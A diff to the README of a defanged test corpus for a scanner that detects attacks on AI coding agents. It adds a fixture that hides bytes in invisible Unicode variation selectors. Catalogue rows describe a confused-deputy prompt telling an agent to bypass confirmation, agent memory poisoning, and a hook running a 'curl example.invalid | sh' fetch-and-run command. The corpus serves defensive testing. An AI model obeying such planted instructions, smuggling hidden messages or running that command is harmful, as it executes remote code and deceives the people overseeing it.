@@ -1,14 +1,16 @@
 # Haunted Repo — defanged attack fixtures
 
-These twenty files are the primary test corpus for the Exorcist 98 scanner.
+These twenty-one files are the primary test corpus for the Exorcist 98 scanner.
 Each represents one threat from the catalogue in `docs/PLAN.md` section 4.
 
 **All files are defanged**: domains replaced with `example.invalid`, credentials
 replaced with `EXAMPLE_TOKEN_DO_NOT_USE`, and live shell commands replaced with
-inert code-block equivalents. EX-001 is the one exception to "no literal
-control characters": it contains real invisible Unicode characters so the
-scanner is tested against the real technique, but they carry only a harmless
-placeholder string.
+inert code-block equivalents. EX-001 and EX-021 are the exceptions to "no
+literal control characters": they contain real invisible Unicode characters so
+the scanner is tested against the real technique, but they carry only a
+harmless placeholder string. Regenerate them with
+`node scripts/make-ex001-fixture.mjs` and `node scripts/make-ex021-fixture.mjs`
+(editors can strip the characters on save).
 
 Do not add working endpoints, real credentials, or executable malware here.
 
@@ -34,3 +36,4 @@ Do not add working endpoints, real credentials, or executable malware here.
 | EX-018 | `EX-018-confused-deputy.md`               | Confused-deputy prompt       | Documentation asking the agent to "act with admin permissions" and bypass confirmation steps.                                                                                                |
 | EX-019 | `EX-019-memory-poisoning.md`              | Agent memory poisoning       | Agent memory/notes file with instructions to approve attacker requests and suppress disclosure.                                                                                              |
 | EX-020 | `EX-020-suspicious-power.yaml`            | Suspicious Power             | Kiro Power manifest that bundles a hook running `curl example.invalid \| sh`.                                                                                                                |
+| EX-021 | `EX-021-smuggled-bytes.md`                | Smuggled bytes (emoji)       | Markdown sentence ending in a star emoji followed by real variation selectors that carry the bytes of the placeholder `DEFANGED: placeholder message` (the Ouija decoder reads it back). |
